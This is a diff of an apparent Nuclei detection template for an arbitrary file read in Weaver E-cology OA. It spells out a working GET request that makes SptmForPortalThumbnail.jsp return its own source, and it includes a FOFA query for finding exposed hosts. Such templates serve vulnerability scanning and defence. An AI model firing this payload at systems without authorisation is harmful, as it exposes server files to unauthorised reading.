@@ -1,5 +1,4 @@
 id: weaver-sptmforportalthumbnail-lfi
-
 info:
   name: OA E-Weaver SptmForPortalThumbnail - Arbitrary File Read
   author: SleepingBag945
@@ -10,35 +9,33 @@ info:
     - http://124.223.89.192/archives/e-cology8-14
     - https://github.com/GREENHAT7/pxplan/blob/main/xray_pocs/yaml-poc-weaver-weaver_e_cology_oa-readfile-CT-479157.yml
   classification:
+    cwe-id:
+      - CWE-22
+      - CWE-73
     cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
-    max-request: 1
-    vendor: weaver
-    product: e-cology
     fofa-query: app="泛微-E-Weaver"
-  tags: weaver,e-cology,oa,lfi,vuln
-
+    max-request: 1
+    product: e-cology
+    vendor: weaver
+    verified: true
+  tags: e-cology,lfi,oa,vuln,weaver
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
-          - "weaver.general.BaseBean"
-          - "getServletConfig"
-        condition: and
-
-      - type: word
-        part: header
+          - weaver.general.BaseBean
+          - getServletConfig
+      - part: header
+        type: word
         words:
-          - "image/png"
-
-      - type: status
-        status:
+          - image/png
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
